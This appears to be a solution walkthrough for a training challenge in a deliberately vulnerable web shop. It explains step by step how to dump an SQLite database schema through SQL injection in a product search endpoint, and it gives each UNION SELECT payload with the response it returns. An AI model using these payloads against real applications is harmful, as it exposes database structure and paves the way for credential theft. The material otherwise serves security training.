        <h1>Exfiltrate the entire DB schema definition <br> via SQL Injection</h1>

    <p>
        An attacker would try to exploit SQL Injection to find out as much as possible about your database schema. 
        This subsequently allows much more targeted, stealthy and devastating SQL Injections, like Retrieve a list 
        of all user credentials via SQL Injection.
    </p>
    <ul>
        <li>Find out which database system is in use and where it would usually store its schema definitions.</li>
        <li>Craft a UNION SELECT attack string to join the relevant data from any such identified system table 
            into the original result.</li>
        <li>You might have to tackle some query syntax issues step-by-step, basically hopping from one error to the next</li>
        <li>As with Order the Christmas special offer of 2014 this cannot be achieved through the application frontend.</li>
    </ul>

    <p>
        Steps:
    </p>
    <ul>
        <li>From any errors seen during previous SQL Injection attempts you should know that SQLite is the relational database in use.</li>
        <li>Check https://www.sqlite.org/faq.html to learn in "(7) How do I list all tables/indices contained in an SQLite database" that 
            the schema is stored in a system table sqlite_master.</li>
        <li>You will also learn that this table contains a column sql which holds the text of the original CREATE TABLE or CREATE INDEX 
            statement that created the table or index. Getting your hands on this would allow you to replicate the entire DB schema.</li>
        <li>During the Order the Christmas special offer of 2014 challenge you learned that the /rest/products/search endpoint is 
            susceptible to SQL Injection into the q parameter.</li>
        <li>The attack payload you need to craft is a UNION SELECT merging the data from the sqlite_master table into the products returned in the JSON result.</li>
        <li>As a starting point we use the known working '))-- attack pattern and try to make a UNION SELECT out of it.</li>
        <li>Searching for ')) UNION SELECT * FROM x-- fails with a SQLITE_ERROR: no such table: x as you would expect.</li>
        <li>Searching for ')) UNION SELECT * FROM sqlite_master-- fails with a promising SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same 
            number of result columns which least confirms the table name.</li>
        <li>The next step in a UNION SELECT-attack is typically to find the right number of returned columns. As the Search Results table in the UI has 3 columns 
            displaying data, it will probably at least be three. You keep adding columns until no more SQLITE_ERROR occurs (or at least it becomes a different one):
            <ul>
                <li>')) UNION SELECT '1' FROM sqlite_master-- fails with number of result columns error</li>
                <li>')) UNION SELECT '1', '2' FROM sqlite_master-- fails with number of result columns error</li>
                <li>')) UNION SELECT '1', '2', '3' FROM sqlite_master-- fails with number of result columns error</li>
                <li>(...)</li>
                <li>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM sqlite_master-- still fails with number of result columns error</li>
                <li>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master-- finally gives you a JSON response back with an extra element 
                {"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}.</li>
              </li>
          </ul>
        <li>Next you get rid of the unwanted product results changing the query into something like qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7',
             '8', '9' FROM sqlite_master-- leaving only the "UNIONed" element in the result set</li>
        <li>The last step is to replace one of the fixed values with correct column name sql, which is why searching for qwert')) UNION SELECT sql, '2', '3', 
            '4', '5', '6', '7', '8', '9' FROM sqlite_master-- solves the challenge.</li>
    </ul>
